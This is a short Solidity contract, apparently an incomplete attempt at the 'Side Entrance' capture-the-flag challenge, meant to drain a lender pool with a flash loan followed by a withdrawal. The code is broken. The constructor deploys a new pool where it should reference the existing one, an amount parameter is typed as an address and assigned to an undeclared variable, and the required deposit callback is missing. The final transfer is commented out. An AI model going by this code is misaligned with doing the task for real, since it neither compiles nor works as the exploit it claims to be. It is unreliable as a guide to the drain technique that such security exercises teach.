// SPDX-License-Identifier: MIT
 pragma solidity 0.8.25;

 import "../side-entrance/SideEntranceLenderPool.sol";
 import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

 contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address public recovery;
    uint256 public amountToAttack;

    constructor(address _pool, address _recovery, address _amount) {
        pool = new SideEntranceLenderPool(_pool);
        recovery = _recovery;
        amount = _amount;
    }

    function attack() external returns(bool) {
        pool.flashLoan(amountToAttack);
        pool.withdraw();

        // payable(recovery).transfer(amountToAttack);

        // return true;
    }
 }